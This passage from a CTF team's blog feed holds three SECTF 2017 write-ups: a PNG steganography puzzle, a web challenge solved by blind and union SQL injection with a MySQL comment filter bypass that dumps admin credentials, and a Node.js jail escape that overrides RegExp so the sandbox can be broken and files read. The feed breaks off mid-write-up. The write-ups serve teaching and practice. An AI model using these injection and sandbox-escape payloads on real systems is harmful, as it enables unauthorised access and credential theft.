    <id>https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/</id>
    <published>2017-09-15T19:17:28.000Z</published>
    <updated>2017-09-15T19:32:12.930Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Joeys screenshot - Misc (50 + 0)<br><br>Joey gave me this screenshot to prove he got into The Gibson. Can you help us hack The Gibson too?<br><br>Solves: 69<br><br>Download: <a href="http://dl.ctf.rocks/joey.tar.gz" target="_blank" rel="external">http://dl.ctf.rocks/joey.tar.gz</a><br><br>Author: SecureLink / klondike<br><br></blockquote>

<p>Pretty simple one, this image had some strange hidden comments, I extracted them using <a href="https://github.com/zed-0xff/zsteg" target="_blank" rel="external">https://github.com/zed-0xff/zsteg</a>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line">$ zsteg chall.png</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 33 36                                          |_36             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 32 37                                          |327             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 43 32                                             |C2              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 31 33 34                                          |134             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 32 34                                          |524             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 4e 32 32                                          |N22             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 48 34 31                                          |H41             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 7b 34                                             |&#123;4              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 31                                          |_11             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 33 33                                          |_33             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 33                                          |_13             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 30 32 31                                          |021             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 45 31                                             |E1              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 33 30                                          |530             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 34 32                                          |342             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 48 34 33                                          |H43             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 30 33 38                                          |038             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 33 35                                          |535             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 50 32 36                                          |P26             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 55 32 35                                          |U25             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 47 33 37                                          |G37             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 34 31 35                                          |415             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 39                                             |39              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 42 31 39                                          |B19             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 53 30                                             |S0              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 55 32 39                                          |U29             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 52 32 38                                          |R28             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 52 33 32                                          |R32             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 31 34                                          |D14             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 32 31 32                                          |212             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 32 33                                          |_23             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 35                                             |D5              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 33 39                                          |D39             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 34 30                                          |_40             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 47 31 37                                          |G17             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 4b 38                                             |K8              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 59 31 30                                          |Y10             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 34 34                                          |344             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 21 34 35                                          |!45             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 32 30                                          |520             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 54 33                                             |T3              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 33 31                                          |331             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 31 31 38                                          |118             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 34 36                                             |46              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 7d 34 36                                          |&#125;46             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 36                                          |_16             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 37                                             |_7              |</div></pre></td></tr></table></figure>
<p>After extracting them into a file I noticed the pattern behind it! if we get some comments we can see something familiar!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">S0</div><div class="line">E1</div><div class="line">C2</div><div class="line">T3</div><div class="line">&#123;4</div></pre></td></tr></table></figure>
<p>Yes! the first letter is a character from the flag and the order is the number after it! so lets write a python script to parse this and construct the flag!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">d = &#123;&#125;</div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'notes.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">	l = f.read().split()</div><div class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> l:</div><div class="line">		d[s[<span class="number">1</span>:]] = s[<span class="number">0</span>]</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">47</span>):</div><div class="line">	flag += d[str(x)]</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p>A now running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python misc50.py </div><div class="line">SECT&#123;D4_K3Y_2_D4_G1B50N_5UP3RU53R_15_G0D_H3H3!&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Joeys screenshot - Misc (50 + 0)&lt;br&gt;&lt;br&gt;Joey gave me this screenshot to prove he got into The Gibson. Can you help us ha
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="misc" scheme="https://teamrocketist.github.io/tags/misc/"/>
    
      <category term="stego" scheme="https://teamrocketist.github.io/tags/stego/"/>
    
      <category term="zsteg" scheme="https://teamrocketist.github.io/tags/zsteg/"/>
    
      <category term="comments" scheme="https://teamrocketist.github.io/tags/comments/"/>
    
      <category term="puzzle" scheme="https://teamrocketist.github.io/tags/puzzle/"/>
    
  </entry>
  
  <entry>
    <title>[Web] SECTF - naughtyads</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/</id>
    <published>2017-09-15T16:10:27.000Z</published>
    <updated>2017-09-15T16:47:39.463Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Naughty ads - Web (200 + 0)<br><br>Can you put agent Gill in the naughty ad section? His phone number is “555-31338”<br><br>Solves: 122<br><br>Service: <a href="http://naughtyads.alieni.se/" target="_blank" rel="external">http://naughtyads.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>

<p>Checking in robots.txt we have a hidden directory called admin, but there is a http authentication and we don’t know the user and the password, we need to find a vulnerability to get the credentials.</p>
<h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>Another Sql injection after some searching I found a GET param vulnerable to blind SQLi</p>
<p>Successful query that returns content :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/55vYxqN.png" alt=""></p>
<p>Unsuccessful query that returns nothing :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/exBhKMF.png" alt=""></p>
<hr>
<h3 id="Bypassing-filters"><a href="#Bypassing-filters" class="headerlink" title="Bypassing filters"></a>Bypassing filters</h3><p>Now there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// bypasses or filter</div><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' <span class="comment">/*!50000or*/</span> 1 AND 'A'='A</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/5iPiplZ.png" alt=""></p>
<h3 id="Performing-Union-Injections"><a href="#Performing-Union-Injections" class="headerlink" title="Performing Union Injections"></a>Performing Union Injections</h3><p>Getting Table names:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(table_name) <span class="comment">/*!50000from*/</span> information_schema.tables <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/rL6GHpT.png" alt=""></p>
<p>Getting Columns names:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(column_name) <span class="comment">/*!50000from*/</span> information_schema.columns <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/LHkGiYk.png" alt=""></p>
<p>Getting the Username and password</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(name, " ", password) <span class="comment">/*!50000from*/</span> login <span class="comment">/*!50000where*/</span> '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/i72v18w.png" alt=""></p>
<p>After searching in google the hash 5ebe2294ecd0e0f08eab7690d2a6ee69 is secret</p>
<hr>
<h3 id="Admin-Login"><a href="#Admin-Login" class="headerlink" title="Admin Login"></a>Admin Login</h3><p>We have a simple form with a image upload well if we remember the challenge description:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</div></pre></td></tr></table></figure>
<p>So lets put the number and submit the form:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://naughtyads.alieni.se/admin/'</span> --user webmasterofdoom3755:secret --data <span class="string">'phone=555-31338'</span></div><div class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</div></pre></td></tr></table></figure>
<p>And we got the flag!!!</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Naughty ads - Web (200 + 0)&lt;br&gt;&lt;br&gt;Can you put agent Gill in the naughty ad section? His phone number is “555-31338”&lt;br&gt;
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="filterbypass" scheme="https://teamrocketist.github.io/tags/filterbypass/"/>
    
      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
    
      <category term="sqlinjection" scheme="https://teamrocketist.github.io/tags/sqlinjection/"/>
    
      <category term="httpauth" scheme="https://teamrocketist.github.io/tags/httpauth/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] SECTF - Jail 1</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/</id>
    <published>2017-09-15T15:08:51.000Z</published>
    <updated>2017-09-15T18:26:44.857Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Jail - Pwn (200 + 0)<br><br>Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with some serious shit, man! Better figure out a way to escape.<br><br>Solves: 43<br><br>Service: jail.alieni.se:55542<br><br>Author: avlidienbrunn<br><br></blockquote>

<p>A jail escape challenge this time with javascript we need, we can start by sending <code>this</code> so we can view the source code of the current function running:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """"""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; this</span></div></pre></td></tr></table></figure>
<p>And we get this source code:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">number</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> hangup = process.exit;</div><div class="line">        <span class="keyword">var</span> line = <span class="string">""</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(number == <span class="number">911</span>)&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"Invalid number"</span>);</div><div class="line">            ask();</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">var</span> flag,<span class="built_in">Array</span>,<span class="built_in">Boolean</span>,<span class="built_in">Date</span>,global,<span class="built_in">Error</span>,<span class="built_in">EvalError</span>,<span class="built_in">Function</span>,<span class="built_in">Number</span>,<span class="built_in">Object</span>,<span class="built_in">RangeError</span>,<span class="built_in">ReferenceError</span>,<span class="built_in">String</span>,<span class="built_in">SyntaxError</span>,<span class="built_in">TypeError</span>,<span class="built_in">URIError</span>,<span class="built_in">decodeURI</span>,<span class="built_in">decodeURIComponent</span>,<span class="built_in">encodeURI</span>,<span class="built_in">encodeURIComponent</span>,<span class="built_in">isFinite</span>,<span class="built_in">isNaN</span>,<span class="built_in">parseFloat</span>,<span class="built_in">parseInt</span>,<span class="built_in">ArrayBuffer</span>,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,<span class="built_in">DataView</span>,<span class="built_in">Float32Array</span>,<span class="built_in">Float64Array</span>,<span class="built_in">Int16Array</span>,<span class="built_in">Int32Array</span>,<span class="built_in">Int8Array</span>,<span class="built_in">Map</span>,<span class="built_in">Promise</span>,<span class="built_in">Proxy</span>,<span class="built_in">Set</span>,<span class="built_in">Symbol</span>,<span class="built_in">Uint16Array</span>,<span class="built_in">Uint32Array</span>,<span class="built_in">Uint8Array</span>,<span class="built_in">Uint8ClampedArray</span>,<span class="built_in">WeakMap</span>,<span class="built_in">WeakSet</span>,assert,clearImmediate,clearInterval,clearTimeout,<span class="built_in">escape</span>,events,<span class="built_in">require</span>,setImmediate,setInterval,setTimeout,stream,<span class="built_in">unescape</span>,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,<span class="keyword">constructor</span>,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf;</div><div class="line"></div><div class="line">        if(new RegExp(/[\[\]\.\\]/).test(number))&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"Dangerous characters detected"</span>);</div><div class="line">            hangup();</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">arguments</span> = <span class="literal">undefined</span>;</div><div class="line"></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"Calling "</span>+<span class="built_in">eval</span>(number)+<span class="string">"... Nobody picks up!"</span>);</div><div class="line">        hangup();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>We can see after we send our <code>number</code> the program will end, at the begin of the function we can see the hangup function is being set into <code>process.exit</code>. We have an interesting feature too if we try to call 911 we will jump into <code>ask</code> function:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; ask</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ask</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    rl.question(template,<span class="function"><span class="keyword">function</span>(<span class="params">answer</span>)</span>&#123;</div><div class="line">        Jail.call(answer);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>As we can see the function ask is restarting the program this will come handy later, we have some restriction too RegexExp class is blocking ‘.’, ‘[‘, ‘]’ and ‘\‘ characters:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/[\[\]\.\\]/</span>).test(number))&#123;</div><div class="line">   <span class="built_in">console</span>.log(<span class="string">"Dangerous characters detected"</span>);</div><div class="line">   hangup();</div><div class="line">   <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>So how do can we bypass this? my plan was:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 - Override RegexExp class to always return true.</div><div class="line">2 - Recall function call but this time with 911 number(this will restart the program and a this point RegexExp returns always false so we can inject any character we want).</div><div class="line">3 - Get the current filename.</div><div class="line">4 - Use process.mainModule.require(&apos;fs&apos;).readFileSync(filename) to read the file and get the flag!</div></pre></td></tr></table></figure>
<h3 id="Override-RegexExp"><a href="#Override-RegexExp" class="headerlink" title="Override RegexExp"></a>Override RegexExp</h3><p>To override the RegexExp class we can just do this:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hangup = <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123; <span class="built_in">RegExp</span> = <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123; test() &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;&#125;; call(<span class="number">911</span>);&#125;</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</span></div><div class="line"><span class="string">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</span></div><div class="line"><span class="string">Invalid number</span></div><div class="line"><span class="string">_____________________________</span></div><div class="line"><span class="string">     ||   ||     ||   ||</span></div><div class="line"><span class="string">     ||   ||, , ,||   ||</span></div><div class="line"><span class="string">     ||  (||/|/(/||/  ||</span></div><div class="line"><span class="string">     ||  ||| _'</span>_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"|</span></div><div class="line"><span class="string">| "</span>You get one call, UNO.<span class="string">"  |</span></div><div class="line"><span class="string"> "</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span></div><div class="line"> Phone <span class="comment">#&gt;</span></div></pre></td></tr></table></figure>
<h3 id="Getting-the-filename"><a href="#Getting-the-filename" class="headerlink" title="Getting the filename"></a>Getting the filename</h3><p>At this point we can inject any characters we want because the test function will always return false! so lets get the filename:</p>
